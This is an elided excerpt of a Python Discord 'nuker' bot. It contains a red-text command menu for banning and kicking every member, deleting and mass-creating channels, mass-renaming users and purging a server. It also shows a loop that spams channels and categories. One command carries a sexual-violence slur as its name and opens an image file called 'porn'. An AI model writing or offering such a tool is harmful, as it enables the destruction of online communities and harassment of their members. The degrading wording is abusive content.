...
import requests
ctypes.windll.kernel32.SetConsoleTitleW(f"Hello!")
...
{Fore.RESET}[{Fore.RED}-{Fore.RESET}]{Fore.RED}rape          {Fore.RESET}[{Fore.RED}SIX SPECIALL!!!{Fore.RESET}] 
{Fore.RESET}[{Fore.RED}-{Fore.RESET}]{Fore.RED}ban          {Fore.RESET}[{Fore.RED}Bans All In Server{Fore.RESET}]
{Fore.RESET}[{Fore.RED}-{Fore.RESET}]{Fore.RED}kick         {Fore.RESET}[{Fore.RED}Kicks All In Server{Fore.RESET}]
{Fore.RESET}[{Fore.RED}-{Fore.RESET}]{Fore.RED}massc        {Fore.RESET}[{Fore.RED}Creates Channels{Fore.RESET}]
{Fore.RESET}[{Fore.RED}-{Fore.RESET}]{Fore.RED}dels         {Fore.RESET}[{Fore.RED}Deletes Channes{Fore.RESET}]
{Fore.RESET}[{Fore.RED}-{Fore.RESET}]{Fore.RED}nickA        {Fore.RESET}[{Fore.RED}Nicknames all{Fore.RESET}]
{Fore.RESET}[{Fore.RED}-{Fore.RESET}]{Fore.RED}delC         {Fore.RESET}[{Fore.RED}Deletes & Creates{Fore.RESET}]
{Fore.RESET}[{Fore.RED}-{Fore.RESET}]{Fore.RED}glee         {Fore.RESET}[{Fore.RED}purges everything{Fore.RESET}]
...
def Init():
    if config.get('token here') == "token here":
        os.system('cls')
...
async def rape(ctx):
        ...
        with open('chase.jpg', 'rb') as porn:
            data = porn.read()
...
async def massc(ctx):
    ...
    for i in range(1, 16):
        try:
            created2 += 3
            await ctx.guild.create_text_channel(name=f'{mitch} {i}')
            await ctx.guild.create_voice_channel(name=f'{mitch} {i}')
            await ctx.guild.create_category(name=f'{mitch} {i}')
        except:
                pass
